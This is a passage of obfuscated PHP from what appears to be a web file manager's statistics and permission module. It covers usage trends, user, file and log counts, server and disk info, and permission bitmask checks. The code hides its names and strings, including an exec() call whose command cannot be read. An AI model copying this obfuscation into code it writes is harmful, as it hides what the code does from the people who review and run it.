$d‚ëÚƒóƒÁ[724] => (int) $fŞõ´ÙæÙ, $d‚ëÚƒóƒÁ[1620] => (int) $dÙòèÙö, $d‚ëÚƒóƒÁ[1621] => (int) $cÌ®öğË÷Ë, $d‚ëÚƒóƒÁ[1622] => (int) $e÷ƒˆïëŠİ); return $this->insert($AÙ¿«Êèáó); goto A¸‚ã§ó•ª; A¸‚ã§ó•ª: } public function trend($aÃèù‘—, $bâ¨†¹¥¾ì) { goto BÑ¶ÑºŸõ; BÑ¶ÑºŸõ: $C¦¬…¤èÔÌ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->init($aÃèù‘—)) { return !1; } $c±ù…İãºï = $this->trendList($aÃèù‘—); goto Dòš•—¶Ë„; EÈ¥×á¸õÛ: return $AÇ¥İ×Œ; goto FÄÀì³ÂÄ; Dòš•—¶Ë„: if ($c±ù…İãºï && $bâ¨†¹¥¾ì != $C¦¬…¤èÔÌ[1500]) { $e‰…¤¾õ„ = $c±ù…İãºï[0][$C¦¬…¤èÔÌ[221]]; $a«¤¸ŒÅå = $this->validDate($bâ¨†¹¥¾ì, $e‰…¤¾õ„); $eŠ«Íø = array(); $b—†Î½åé÷ = array_to_keyvalue($c±ù…İãºï, $C¦¬…¤èÔÌ[221]); foreach ($a«¤¸ŒÅå as $A„Ë ä ¦›) { if (isset($b—†Î½åé÷[$A„Ë ä ¦›])) { $Bô¨„¡÷Ö‚ = $b—†Î½åé÷[$A„Ë ä ¦›]; } else { $Bô¨„¡÷Ö‚ = end($c±ù…İãºï); $Bô¨„¡÷Ö‚[$C¦¬…¤èÔÌ[221]] = $A„Ë ä ¦›; if ($aÃèù‘— == $C¦¬…¤èÔÌ[561]) { $Bô¨„¡÷Ö‚[$C¦¬…¤èÔÌ[1616]] = $Bô¨„¡÷Ö‚[$C¦¬…¤èÔÌ[1617]] = 0; } } $eŠ«Íø[] = $Bô¨„¡÷Ö‚; } $c±ù…İãºï = $eŠ«Íø; } $C‰§‰Œ¬©Ò = array($C¦¬…¤èÔÌ[561] => array($C¦¬…¤èÔÌ[726] => LNG($C¦¬…¤èÔÌ[1632]), $C¦¬…¤èÔÌ[1616] => LNG($C¦¬…¤èÔÌ[1633]), $C¦¬…¤èÔÌ[1617] => LNG($C¦¬…¤èÔÌ[1634])), $C¦¬…¤èÔÌ[1618] => array($C¦¬…¤èÔÌ[724] => LNG($C¦¬…¤èÔÌ[1635]), $C¦¬…¤èÔÌ[1620] => LNG($C¦¬…¤èÔÌ[1636]), $C¦¬…¤èÔÌ[1621] => LNG($C¦¬…¤èÔÌ[1637]), $C¦¬…¤èÔÌ[1622] => LNG($C¦¬…¤èÔÌ[1638]))); $EÖŒå´ªÛ  = array($C¦¬…¤èÔÌ[561] => $C¦¬…¤èÔÌ[1639], $C¦¬…¤èÔÌ[1618] => $C¦¬…¤èÔÌ[78]); goto Cª§¼‹Ì†Ö; Cª§¼‹Ì†Ö: if (empty($c±ù…İãºï)) { $A„Ë ä ¦› = date($C¦¬…¤èÔÌ[1623], strtotime($C¦¬…¤èÔÌ[1624])); $fÙøµ–Î = array($C¦¬…¤èÔÌ[221] => $A„Ë ä ¦›); foreach ($C‰§‰Œ¬©Ò[$aÃèù‘—] as $eØ¥ÃÜíŒ‹ => $CÁ‹Ä¤³°Î) { $fÙøµ–Î[$eØ¥ÃÜíŒ‹] = 0; } $c±ù…İãºï[] = $fÙøµ–Î; } $AÇ¥İ×Œ = array(); foreach ($c±ù…İãºï as $CÁ‹Ä¤³°Î) { if ($aÃèù‘— == $C¦¬…¤èÔÌ[1618] && $CÁ‹Ä¤³°Î[$C¦¬…¤èÔÌ[1620]] > $CÁ‹Ä¤³°Î[$C¦¬…¤èÔÌ[724]]) { $CÁ‹Ä¤³°Î[$C¦¬…¤èÔÌ[1620]] = $CÁ‹Ä¤³°Î[$C¦¬…¤èÔÌ[724]]; } foreach ($C‰§‰Œ¬©Ò[$aÃèù‘—] as $eØ¥ÃÜíŒ‹ => $AÍÌ‡¾ÇÏë) { $Bô¨„¡÷Ö‚ = array($C¦¬…¤èÔÌ[221] => $CÁ‹Ä¤³°Î[$C¦¬…¤èÔÌ[221]], $C¦¬…¤èÔÌ[1432] => $AÍÌ‡¾ÇÏë); $Bô¨„¡÷Ö‚[$EÖŒå´ªÛ [$aÃèù‘—]] = isset($CÁ‹Ä¤³°Î[$eØ¥ÃÜíŒ‹]) ? $CÁ‹Ä¤³°Î[$eØ¥ÃÜíŒ‹] : 0; $AÇ¥İ×Œ[] = $Bô¨„¡÷Ö‚; } } goto EÈ¥×á¸õÛ; FÄÀì³ÂÄ: } public function validDate($dĞÂ®«²—‡, $cùÑİ¡ÅÙ²) { goto A‚¾‹‘ëóÀ; b—ãì¤®º: return $eÇ®ŞÚÂöº; goto Fõ¹öİ¢´ß; d‘É„µÍˆø: switch ($dĞÂ®«²—‡) { case $dÉ‡ª˜Û¯[1507]: $D©§‘‘ğÙ = mktime(0, 0, 0, date($dÉ‡ª˜Û¯[1640]), date($dÉ‡ª˜Û¯[1251]) - date($dÉ‡ª˜Û¯[1313]) + 7 - 7, date($dÉ‡ª˜Û¯[1641])); $c´Ù¬–µƒå = 0; do { $b¾“˜ÛÓÕ¨ = date($dÉ‡ª˜Û¯[1623], $D©§‘‘ğÙ - 3600 * 24 * 7 * $c´Ù¬–µƒå); $eÇ®ŞÚÂöº[] = $b¾“˜ÛÓÕ¨; $c´Ù¬–µƒå++; } while ($cùÑİ¡ÅÙ² < $b¾“˜ÛÓÕ¨); break; case $dÉ‡ª˜Û¯[1505]: $c´Ù¬–µƒå = 1; do { $Fùª´ éó› = date($dÉ‡ª˜Û¯[1642], strtotime("\x2d\x20{$c´Ù¬–µƒå}\40\x6d\157\x6e\164\x68\163")); $eÇ®ŞÚÂöº[] = $Fùª´ éó›; $c´Ù¬–µƒå++; } while ($cùÑİ¡ÅÙ² < $Fùª´ éó›); break; case $dÉ‡ª˜Û¯[1643]: $dªÖ‹°Ñ± = (int) date($dÉ‡ª˜Û¯[1641], strtotime($cùÑİ¡ÅÙ²)); $Câ©‹“ÒÇ = (int) date($dÉ‡ª˜Û¯[1641]); if ($dªÖ‹°Ñ± >= $Câ©‹“ÒÇ) { break; } for ($dªÖ‹°Ñ±; $dªÖ‹°Ñ± < $Câ©‹“ÒÇ; $dªÖ‹°Ñ±++) { $eÇ®ŞÚÂöº[] = $dªÖ‹°Ñ± . $dÉ‡ª˜Û¯[1644]; } break; default: break; } if ($cùÑİ¡ÅÙ² > end($eÇ®ŞÚÂöº)) { array_pop($eÇ®ŞÚÂöº); } sort($eÇ®ŞÚÂöº); goto b—ãì¤®º; A‚¾‹‘ëóÀ: $dÉ‡ª˜Û¯ =& $_SERVER[Ç³Íß¦Ó]; $Dõ„‹³‰– = date($dÉ‡ª˜Û¯[1623], strtotime($dÉ‡ª˜Û¯[1624])); $eÇ®ŞÚÂöº = array($Dõ„‹³‰–); goto d‘É„µÍˆø; Fõ¹öİ¢´ß: } public function listTable($E•äêö®ìÄ) { $F‘ª•Ìì¸Û = ucfirst($E•äêö®ìÄ); return Model($F‘ª•Ìì¸Û)->listData(); } public function option($AÕ„’†­ª£) { $a¼æ«Šõ = $_SERVER[Ç³Íß¦Ó][1645] . ucfirst($AÕ„’†­ª£); return $this->{$a¼æ«Šõ}(); } private function optionUser() { goto fŒÔÒÚíœ„; eÄ•˜Ùëê: if (!$FÇä‰Ã¿é) { $FÇä‰Ã¿é = 1; } $BÇø¼Ì™œ = array($F¨Ô‚‡Ç¤[1647] => array($F¨Ô‚‡Ç¤[971], $C¯—±Ò¬Á†)); $aß¡ß»Ó¥á = Model($F¨Ô‚‡Ç¤[505])->where($BÇø¼Ì™œ)->count($F¨Ô‚‡Ç¤[1526]); goto FÃà×¯š‘; cƒÂÀ·‘ÂÍ: if ($Fİ‹®©º”ç < $C¯—±Ò¬Á†) { $Fİ‹®©º”ç = $C¯—±Ò¬Á†; } $BÇø¼Ì™œ = array($F¨Ô‚‡Ç¤[1647] => array($F¨Ô‚‡Ç¤[971], $Fİ‹®©º”ç)); $FÇä‰Ã¿é = (int) Model($F¨Ô‚‡Ç¤[505])->where($BÇø¼Ì™œ)->count($F¨Ô‚‡Ç¤[1526]); goto eÄ•˜Ùëê; fŒÔÒÚíœ„: $F¨Ô‚‡Ç¤ =& $_SERVER[Ç³Íß¦Ó]; $A°‚Ä–Î¢º = Model($F¨Ô‚‡Ç¤[505])->count($F¨Ô‚‡Ç¤[1526]); $Dà¾Œ›øÎ = Model($F¨Ô‚‡Ç¤[505])->where($F¨Ô‚‡Ç¤[1646])->count($F¨Ô‚‡Ç¤[1526]); goto fÆø™’®Äâ; FÃà×¯š‘: return array($F¨Ô‚‡Ç¤[720] => (int) $A°‚Ä–Î¢º, $F¨Ô‚‡Ç¤[1648] => (int) ($A°‚Ä–Î¢º - $Dà¾Œ›øÎ), $F¨Ô‚‡Ç¤[1649] => (int) $Dà¾Œ›øÎ, $F¨Ô‚‡Ç¤[1650] => (int) $aß¡ß»Ó¥á, $F¨Ô‚‡Ç¤[1651] => $FÇä‰Ã¿é); goto d»à‚Üœ­; fÆø™’®Äâ: $Dø…ÔŠ§Ö = intval($GLOBALS[$F¨Ô‚‡Ç¤[6]][$F¨Ô‚‡Ç¤[346]][$F¨Ô‚‡Ç¤[1486]]) / 3600; $Fİ‹®©º”ç = strtotime("\55{$Dø…ÔŠ§Ö}\40\x68\x6f\x75\x72\163"); $C¯—±Ò¬Á† = strtotime(date($F¨Ô‚‡Ç¤[1627])); goto cƒÂÀ·‘ÂÍ; d»à‚Üœ­: } private function optionFile() { goto A—â‚ÓÔ¸¤; D¢ß¥È±İó: $BÛè›Ş­óÆ = $aÈà¶ä½[$AÍÁ®Äá·É[1620]]; $BæŒê¾›˜Ê = Model($AÍÁ®Äá·É[791])->where(array($AÍÁ®Äá·É[401] => 0))->count($AÍÁ®Äá·É[394]); $aˆÇóó•¢ğ = array($AÍÁ®Äá·É[401] => 0, $AÍÁ®Äá·É[193] => array($AÍÁ®Äá·É[971], strtotime(date($AÍÁ®Äá·É[1627])))); goto DÎ„õ–ÑìÅ; DÎ„õ–ÑìÅ: $FÕö†Ÿ–°³ = Model($AÍÁ®Äá·É[791])->where($aˆÇóó•¢ğ)->sum($AÍÁ®Äá·É[78]); $Eøë„Ú©ãª = Model($AÍÁ®Äá·É[791])->where($aˆÇóó•¢ğ)->count($AÍÁ®Äá·É[394]); return array($AÍÁ®Äá·É[724] => $fÛ®´¦Û•, $AÍÁ®Äá·É[1620] => $BÛè›Ş­óÆ, $AÍÁ®Äá·É[1652] => $fÛ®´¦Û• - $BÛè›Ş­óÆ, $AÍÁ®Äá·É[1653] => (int) $FÕö†Ÿ–°³, $AÍÁ®Äá·É[726] => (int) $BæŒê¾›˜Ê, $AÍÁ®Äá·É[1654] => (int) $Eøë„Ú©ãª); goto bÈÉ¯ÑŒ³Ú; A—â‚ÓÔ¸¤: $AÍÁ®Äá·É =& $_SERVER[Ç³Íß¦Ó]; $aÈà¶ä½ = $this->sourceSize(); $fÛ®´¦Û• = $aÈà¶ä½[$AÍÁ®Äá·É[78]]; goto D¢ß¥È±İó; bÈÉ¯ÑŒ³Ú: } private function optionAccess() { $aˆ‡Ñæè‹ =& $_SERVER[Ç³Íß¦Ó]; return array($aˆ‡Ñæè‹[720] => $this->typeLogCnt(), $aˆ‡Ñæè‹[107] => $this->typeLogCnt($aˆ‡Ñæè‹[107]), $aˆ‡Ñæè‹[428] => $this->typeLogCnt($aˆ‡Ñæè‹[428]), $aˆ‡Ñæè‹[1655] => $this->typeLogCnt($aˆ‡Ñæè‹[1655]), $aˆ‡Ñæè‹[1656] => $this->typeLogCnt($aˆ‡Ñæè‹[1656]), $aˆ‡Ñæè‹[561] => $this->typeLogCnt($aˆ‡Ñæè‹[33], $aˆ‡Ñæè‹[1631])); } private function typeLogCnt($BØ¸†Ü‡ = '', $aÅ×İÄªÕõ = "\x69\x64") { goto aéà‰‘¾æ; aéà‰‘¾æ: $EœĞÏ™‚‚ =& $_SERVER[Ç³Íß¦Ó]; $cŸñàÔİƒ© = array($EœĞÏ™‚‚[107] => array($EœĞÏ™‚‚[1657], $EœĞÏ™‚‚[1658]), $EœĞÏ™‚‚[428] => array($EœĞÏ™‚‚[1659], $EœĞÏ™‚‚[1660]), $EœĞÏ™‚‚[1655] => array($EœĞÏ™‚‚[1661], $EœĞÏ™‚‚[1662], $EœĞÏ™‚‚[1663]), $EœĞÏ™‚‚[1656] => array($EœĞÏ™‚‚[1664], $EœĞÏ™‚‚[1665]), $EœĞÏ™‚‚[1666] => array($EœĞÏ™‚‚[1667], $EœĞÏ™‚‚[1668], $EœĞÏ™‚‚[1669])); $E’¢â¼Ã¢ = strtotime(date($EœĞÏ™‚‚[1627])); goto f•ìÃ³ï¶à; fÅµ™®Éª: return (int) $F—§Íõ§; goto Eƒª¥µø‚Ÿ; f•ìÃ³ï¶à: $f«§öåÍª = array($EœĞÏ™‚‚[193] => array($EœĞÏ™‚‚[971], $E’¢â¼Ã¢)); if ($BØ¸†Ü‡) { $f«§öåÍª[$EœĞÏ™‚‚[29]] = array($EœĞÏ™‚‚[7], $cŸñàÔİƒ©[$BØ¸†Ü‡]); } $F—§Íõ§ = Model($EœĞÏ™‚‚[1630])->where($f«§öåÍª)->count($aÅ×İÄªÕõ); goto fÅµ™®Éª; Eƒª¥µø‚Ÿ: } private function optionServer() { goto eÃ‡­ñÖ; Aˆ§§èÎ©: $CÎ·œ±æÔ = $a³©ƒš…ê‰[0]; $fÍÙÊ±ğìº = $GLOBALS[$eã÷î„ãÓÃ[6]][$eã÷î„ãÓÃ[17]]; $dÍö‚òÌÊ = $fÍÙÊ±ğìº[$eã÷î„ãÓÃ[932]]; goto DÁĞ îóñ†; b ¡¯å•â: return array($eã÷î„ãÓÃ[1672] => $e‡¹¤Ë»Œ› ? $e‡¹¤Ë»Œ›[$eã÷î„ãÓÃ[1673]] : 0, $eã÷î„ãÓÃ[1674] => $e‡¹¤Ë»Œ› ? $e‡¹¤Ë»Œ›[$eã÷î„ãÓÃ[1675]] : 0, $eã÷î„ãÓÃ[1676] => (int) $a½´ãÛö“¸[$eã÷î„ãÓÃ[1673]] * 1024 * 1024 * 1024, $eã÷î„ãÓÃ[1677] => (int) $AÜ× ‚ªÑ•, $eã÷î„ãÓÃ[1678] => ucfirst($CÎ·œ±æÔ), $eã÷î„ãÓÃ[1679] => $eã÷î„ãÓÃ[1680] . PHP_VERSION, $eã÷î„ãÓÃ[1681] => phpBuild64() ? 64 : 32, $eã÷î„ãÓÃ[719] => str_replace($eã÷î„ãÓÃ[1682], $eã÷î„ãÓÃ[948], $dÍö‚òÌÊ), $eã÷î„ãÓÃ[346] => ucfirst($eìÆ»÷óàç), $eã÷î„ãÓÃ[28] => $_SERVER[$eã÷î„ãÓÃ[1683]]); goto b¨â‡¸°Øï; dÅò‘ß¦ê: $a°Ç¢‰”Ğ = array($eã÷î„ãÓÃ[783] => $a½´ãÛö“¸[$eã÷î„ãÓÃ[392]]); $AÜ× ‚ªÑ• = Model($eã÷î„ãÓÃ[448])->where($a°Ç¢‰”Ğ)->sum($eã÷î„ãÓÃ[78]); $a³©ƒš…ê‰ = explode($eã÷î„ãÓÃ[50], $_SERVER[$eã÷î„ãÓÃ[142]]); goto Aˆ§§èÎ©; eÃ‡­ñÖ: $eã÷î„ãÓÃ =& $_SERVER[Ç³Íß¦Ó]; $e‡¹¤Ë»Œ› = $this->diskDriver(); $a½´ãÛö“¸ = KodIO::defaultDriver(); goto dÅò‘ß¦ê; DÁĞ îóñ†: if ($dÍö‚òÌÊ == $eã÷î„ãÓÃ[756]) { $a•ŠŒÀæµˆ = explode($eã÷î„ãÓÃ[1165], $fÍÙÊ±ğìº[$eã÷î„ãÓÃ[931]]); $dÍö‚òÌÊ = $a•ŠŒÀæµˆ[0]; } if ($dÍö‚òÌÊ == $eã÷î„ãÓÃ[759] || $dÍö‚òÌÊ == $eã÷î„ãÓÃ[760]) { $a´ç†­¶ = Model()->db()->query($eã÷î„ãÓÃ[1670]); $AÁÅîÆ±… = $a´ç†­¶[0] && isset($a´ç†­¶[0][$eã÷î„ãÓÃ[1431]]) ? $a´ç†­¶[0][$eã÷î„ãÓÃ[1431]] : 0; $dÍö‚òÌÊ = $eã÷î„ãÓÃ[1671] . ($AÁÅîÆ±… ? $eã÷î„ãÓÃ[8] . $AÁÅîÆ±… : $eã÷î„ãÓÃ[33]); } $eìÆ»÷óàç = $GLOBALS[$eã÷î„ãÓÃ[6]][$eã÷î„ãÓÃ[346]][$eã÷î„ãÓÃ[793]]; goto b ¡¯å•â; b¨â‡¸°Øï: } private function diskDriver() { goto a‰©ç•Å…¡; AƒÔë‘¨äô: $cËºšØ = $FÜ„¿”»Ğ– - @disk_free_space($EãÚƒìã‚Å); return array($AìÑùîÕÌ‡[1673] => $FÜ„¿”»Ğ–, $AìÑùîÕÌ‡[1675] => $cËºšØ); goto BÎÜ«¾¤ˆá; a‰©ç•Å…¡: $AìÑùîÕÌ‡ =& $_SERVER[Ç³Íß¦Ó]; $EãÚƒìã‚Å = $AìÑùîÕÌ‡[8]; $e„Éƒš»ÊÖ = $GLOBALS[$AìÑùîÕÌ‡[6]][$AìÑùîÕÌ‡[1684]] == $AìÑùîÕÌ‡[1685]; goto b‘·òÅâ–á; b‘·òÅâ–á: if ($e„Éƒš»ÊÖ) { $EãÚƒìã‚Å = $AìÑùîÕÌ‡[1686]; if (function_exists($AìÑùîÕÌ‡[1687])) { exec($AìÑùîÕÌ‡[1688], $bÕ®öãŞ); $EãÚƒìã‚Å = $bÕ®öãŞ[1] . $AìÑùîÕÌ‡[8]; } } if (!file_exists($EãÚƒìã‚Å)) { return; } $FÜ„¿”»Ğ– = @disk_total_space($EãÚƒìã‚Å); goto AƒÔë‘¨äô; BÎÜ«¾¤ˆá: } public function fileChart($c§ËóµÌ‡—) { goto F»ÌÊæŸ‹Ÿ; AâŸ¸Ş••: $CÃÅ–‚ÜÕ[$d‘Œêóæß[402]] = 2; $DŸ‘ô–§ = Model($d‘Œêóæß[791])->where($CÃÅ–‚ÜÕ)->sum($d‘Œêóæß[78]); return array($d‘Œêóæß[724] => $cßÇÌ‡‘¢š[$d‘Œêóæß[78]], $d‘Œêóæß[1620] => $cßÇÌ‡‘¢š[$d‘Œêóæß[1620]], $d‘Œêóæß[1621] => (int) $DÑ³¸İƒ, $d‘Œêóæß[1622] => (int) $DŸ‘ô–§); goto FÉëÀé“Çï; fÔñÊÍ´ÇÀ: $cßÇÌ‡‘¢š = $this->sourceSize(); $CÃÅ–‚ÜÕ = array($d‘Œêóæß[476] => 0, $d‘Œêóæß[402] => 1); $DÑ³¸İƒ = Model($d‘Œêóæß[791])->where($CÃÅ–‚ÜÕ)->sum($d‘Œêóæß[78]); goto AâŸ¸Ş••; F»ÌÊæŸ‹Ÿ: $d‘Œêóæß =& $_SERVER[Ç³Íß¦Ó]; if (isset($c§ËóµÌ‡—[$d‘Œêóæß[1526]])) { return Model($d‘Œêóæß[791])->userFileTypeProfile($c§ËóµÌ‡—[$d‘Œêóæß[1526]]); } if (isset($c§ËóµÌ‡—[$d‘Œêóæß[1689]])) { return Model($d‘Œêóæß[791])->groupFileTypeProfile($c§ËóµÌ‡—[$d‘Œêóæß[1689]]); } goto fÔñÊÍ´ÇÀ; FÉëÀé“Çï: } private function sourceSize() { $A÷õ¿Éİßì =& $_SERVER[Ç³Íß¦Ó]; $b¤Üâ×«ˆ¯ = Model($A÷õ¿Éİßì[791])->where(array($A÷õ¿Éİßì[401] => 0))->sum($A÷õ¿Éİßì[78]); $eà÷ôß  = Model($A÷õ¿Éİßì[448])->sum($A÷õ¿Éİßì[78]); if ($eà÷ôß  > $b¤Üâ×«ˆ¯) { $eà÷ôß  = $b¤Üâ×«ˆ¯; } return array($A÷õ¿Éİßì[78] => (int) $b¤Üâ×«ˆ¯, $A÷õ¿Éİßì[1620] => (int) $eà÷ôß ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $c×Ú¢º……ì =& $_SERVER[Ç³Íß¦Ó]; $E¶êô¡íÇ = array(array($c×Ú¢º……ì[411] => LNG($c×Ú¢º……ì[1690]), $c×Ú¢º……ì[1691] => $c×Ú¢º……ì[1692], $c×Ú¢º……ì[1693] => 1, $c×Ú¢º……ì[1694] => 1, $c×Ú¢º……ì[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($c×Ú¢º……ì[411] => LNG($c×Ú¢º……ì[1696]), $c×Ú¢º……ì[1691] => $c×Ú¢º……ì[1697], $c×Ú¢º……ì[1693] => 2, $c×Ú¢º……ì[1694] => 1, $c×Ú¢º……ì[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($c×Ú¢º……ì[411] => LNG($c×Ú¢º……ì[1698]), $c×Ú¢º……ì[1691] => $c×Ú¢º……ì[1699], $c×Ú¢º……ì[1693] => 3, $c×Ú¢º……ì[1694] => 1, $c×Ú¢º……ì[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($c×Ú¢º……ì[411] => LNG($c×Ú¢º……ì[1700]), $c×Ú¢º……ì[1691] => $c×Ú¢º……ì[1701], $c×Ú¢º……ì[1693] => 4, $c×Ú¢º……ì[1694] => 1, $c×Ú¢º……ì[1695] => self::AUTH_SHOW | self::AUTH_VIEW), array($c×Ú¢º……ì[411] => LNG($c×Ú¢º……ì[1702]), $c×Ú¢º……ì[1691] => $c×Ú¢º……ì[1703], $c×Ú¢º……ì[1693] => 5, $c×Ú¢º……ì[1694] => 1, $c×Ú¢º……ì[1695] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($c×Ú¢º……ì[411] => LNG($c×Ú¢º……ì[1704]), $c×Ú¢º……ì[1691] => $c×Ú¢º……ì[1705], $c×Ú¢º……ì[1693] => 6, $c×Ú¢º……ì[1694] => 1, $c×Ú¢º……ì[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($c×Ú¢º……ì[411] => LNG($c×Ú¢º……ì[1706]), $c×Ú¢º……ì[1691] => $c×Ú¢º……ì[1707], $c×Ú¢º……ì[1693] => 7, $c×Ú¢º……ì[1694] => 1, $c×Ú¢º……ì[1695] => 0)); return $E¶êô¡íÇ; } public static function authCheck($B¼›«›¥¯¨, $DËì°™Š¸) { $B¼›«›¥¯¨ = intval($B¼›«›¥¯¨); if ($GLOBALS[$_SERVER[Ç³Íß¦Ó][483]]) { return !0; } if ($B¼›«›¥¯¨ <= 0) { return !1; } if (($B¼›«›¥¯¨ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($B¼›«›¥¯¨ & $DËì°™Š¸); } public static function authCheckShow($b²ˆ¹Œâ‰Ú) { return self::authCheck($b²ˆ¹Œâ‰Ú, self::AUTH_SHOW); } public static function authCheckView($F¡©êÎŠÑ¥) { return self::authCheck($F¡©êÎŠÑ¥, self::AUTH_VIEW); } public static function authCheckDownload($fÊ»¼ß’) { return self::authCheck($fÊ»¼ß’, self::AUTH_DOWNLOAD); } public static function authCheckUpload($FØ —ööŒÃ) { return self::authCheck($FØ —ööŒÃ, self::AUTH_UPLOAD); } public static function authCheckEdit($c”ç‡ŸøÍ ) { return self::authCheck($c”ç‡ŸøÍ , self::AUTH_EDIT); } public static function authCheckRemove($f‹™ƒ»“ì—) { return self::authCheck($f‹™ƒ»“ì—, self::AUTH_REMOVE); } public static function authCheckShare($Fğ„ÖËÆô™) { return self::authCheck($Fğ„ÖËÆô™, self::AUTH_SHARE); } public static function authCheckComment($E³İ¼•âÒ) { return self::authCheck($E³İ¼•âÒ, self::AUTH_COMMENT); } public static function authCheckEvent($b‰æ¢“Ùôæ) { return self::authCheck($b‰æ¢“Ùôæ, self::AUTH_EVENT); } public static function authCheckRoot($b›øôµ¨Ä) { return self::authCheck($b›øôµ¨Ä, self::AUTH_ROOT); } public static function authCheckAction($E­¼÷­ˆÕ, $c‡ÁÛŞŞôó) { goto A«ÉÒè—ºğ; bÓ‹èøÔ”: if (($E­¼÷­ˆÕ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($E­¼÷­ˆÕ & $d¿Ë·áäßù); goto b…ĞÇÜ“â; dä†ó¾ÏÙ¦: $d¿Ë·áäßù = $Aæ°²…“[$c‡ÁÛŞŞôó]; $E­¼÷­ˆÕ = intval($E­¼÷­ˆÕ); if ($E­¼÷­ˆÕ <= 0) { return !1; } goto bÓ‹èøÔ”; A«ÉÒè—ºğ: $E§«­Ş›ãè =& $_SERVER[Ç³Íß¦Ó]; $Aæ°²…“ = array($E§«­Ş›ãè[1708] => self::AUTH_VIEW, $E§«­Ş›ãè[1094] => self::AUTH_DOWNLOAD, $E§«­Ş›ãè[107] => self::AUTH_UPLOAD, $E§«­Ş›ãè[1656] => self::AUTH_EDIT, $E§«­Ş›ãè[1655] => self::AUTH_REMOVE, $E§«­Ş›ãè[1666] => self::AUTH_SHARE, $E§«­Ş›ãè[351] => self::AUTH_COMMENT, $E§«­Ş›ãè[1515] => self::AUTH_EVENT, $E§«­Ş›ãè[1709] => self::AUTH_ROOT); if (!isset($Aæ°²…“[$c‡ÁÛŞŞôó])) { return; } goto dä†ó¾ÏÙ¦; b…ĞÇÜ“â: } public static function authDisable($dÍåÖ®…–Ú, $fßÌº‡–Ï) { if (intval($dÍåÖ®…–Ú) <= 0) { return 0; } return intval($dÍåÖ®…–Ú) & ~$fßÌº‡–Ï; } public $optionType = "\123\x79\x73\x74\x65\155\56\x73\x6f\x75\x72\143\x65\101\165\164\x68\114\151\163\164"; public $field = array("\x6e\141\x6d\145", "\x61\x75\164\150", "\x6c\141\142\145\x6c", "\144\151\x73\160\x6c\141\171", "\163\171\163\x74\x65\155", "\163\x6f\162\164"); public function initData() { $f÷˜ğ°Ãé = $this->authDefault(); foreach ($f÷˜ğ°Ãé as $D¬Ê´ŠÔ°¾) { $this->add($D¬Ê´ŠÔ°¾); } } public function listData($cÔ‹¡—‰Óå = false, $D‘Ááæ£ˆ = "\x73\157\162\x74", $b…šòÛ•ë° = false) { return parent::listData($cÔ‹¡—‰Óå, $D‘Ááæ£ˆ, $b…šòÛ•ë°); } public function update($FÜ§ö‘µÑŸ, $fäÂÎ”) { $F«Ø©ÎÛä =& $_SERVER[Ç³Íß¦Ó]; $A¯Ë‡¢ğÑ = parent::listData($FÜ§ö‘µÑŸ); $Dé¬¯“è³¾ = $this->findByName($fäÂÎ”[$F«Ø©ÎÛä[28]]); if (!$A¯Ë‡¢ğÑ || $Dé¬¯“è³¾ && $Dé¬¯“è³¾[$F«Ø©ÎÛä[392]] != $A¯Ë‡¢ğÑ[$F«Ø©ÎÛä[392]]) { return !1; } $this->filterAuth($fäÂÎ”[$F«Ø©ÎÛä[404]]); return parent::update($FÜ§ö‘µÑŸ, $fäÂÎ”); } public function remove($aÁºÄÊ²§) { $eö¥ŞäÉë¹ = parent::listData($aÁºÄÊ²§); if (!$eö¥ŞäÉë¹ || $eö¥ŞäÉë¹[$_SERVER[Ç³Íß¦Ó][1169]]) { return !1; } return parent::remove($aÁºÄÊ²§); } public function add($BË±ÃÜ¡ÚÃ = array()) { goto bšò«¯éŠ¢; A¡Îáğ¸ç: return parent::insert($BË±ÃÜ¡ÚÃ); goto Dø‚òÒíĞ…; bšò«¯éŠ¢: $bÚŒ¡ÚëÒò =& $_SERVER[Ç³Íß¦Ó]; if ($this->findByName($BË±ÃÜ¡ÚÃ[$bÚŒ¡ÚëÒò[28]])) { return !1; } $e¼Œ×ˆˆ† = array($bÚŒ¡ÚëÒò[28] => $bÚŒ¡ÚëÒò[33], $bÚŒ¡ÚëÒò[404] => 1, $bÚŒ¡ÚëÒò[1710] => $bÚŒ¡ÚëÒò[1699], $bÚŒ¡ÚëÒò[1711] => 1, $bÚŒ¡ÚëÒò[1169] => 0, $bÚŒ¡ÚëÒò[1712] => 0); goto BÂ‡ÊÚ±âÀ; BÂ‡ÊÚ±âÀ: $BË±ÃÜ¡ÚÃ = array_merge($e¼Œ×ˆˆ†, $BË±ÃÜ¡ÚÃ); $BË±ÃÜ¡ÚÃ[$bÚŒ¡ÚëÒò[1712]] = $this->getSort(); $this->filterAuth($BË±ÃÜ¡ÚÃ[$bÚŒ¡ÚëÒò[404]]); goto A¡Îáğ¸ç; Dø‚òÒíĞ…: } private function getSort() { $Eó›†ªÊ›É =& $_SERVER[Ç³Íß¦Ó]; $C†ÖØÛñÈ = parent::listData(); $CÖœÛ­˜êğ = array_to_keyvalue($C†ÖØÛñÈ, 